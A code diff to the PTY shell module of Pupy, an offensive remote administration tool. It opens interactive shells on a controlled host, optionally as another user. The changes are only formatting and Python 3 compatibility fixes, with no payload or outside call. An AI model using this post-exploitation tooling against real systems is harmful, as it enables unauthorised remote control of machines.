@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+# Pupy is under the BSD 3-Clause license. see the LICENSE
+# file at the root of the project for the detailed licence terms
 
 from __future__ import absolute_import
 from __future__ import division
@@ -31,13 +32,16 @@ from pupy import manager, Task
 
 if sys.version_info.major > 2:
     basestring = str
+    long = int
 
 DEFAULT_SHELL = None
 
 
 def propose_shell():
     PATHS = os.environ.get(
-        'PATH', '/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/system/bin'
+        'PATH',
+        '/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:'
+        '/usr/local/sbin:/system/bin'
     ).split(':')
 
     SHELLS = ['bash', 'ash', 'zsh', 'sh', 'ksh', 'csh']
@@ -57,6 +61,7 @@ def propose_shell():
 
                 yield shell
 
+
 def find_shell():
     global DEFAULT_SHELL
 
@@ -71,10 +76,11 @@ def find_shell():
 
     return DEFAULT_SHELL
 
+
 def prepare(suid):
     if suid is not None:
         try:
-            if not type(suid) in (int, long):
+            if not isinstance(suid, (int, long)):
                 userinfo = pwd.getpwnam(suid)
                 suid = userinfo.pw_uid
                 sgid = userinfo.pw_gid
@@ -112,11 +118,13 @@ def prepare(suid):
             pass
 
     os.setsid()
+
     try:
         fcntl.ioctl(sys.stdin, termios.TIOCSCTTY, 0)
     except:
         # No life without control terminal :(
         os._exit(-1)
+
 
 class PtyShell(Task):
     __slots__ = (
@@ -231,7 +239,7 @@ class PtyShell(Task):
         if euid != uid:
             os.seteuid(euid)
 
-        self.master = os.fdopen(master, 'rb+wb', 0) # open file in an unbuffered mode
+        self.master = os.fdopen(master, 'w+b', 0) # open file in an unbuffered mode
         flags = fcntl.fcntl(self.master, fcntl.F_GETFL)
         assert flags >= 0
         flags = fcntl.fcntl(self.master, fcntl.F_SETFL, flags | os.O_NONBLOCK)
@@ -285,6 +293,7 @@ class PtyShell(Task):
 
         try:
             self._read_loop()
+
         finally:
             try:
                 self.stop()
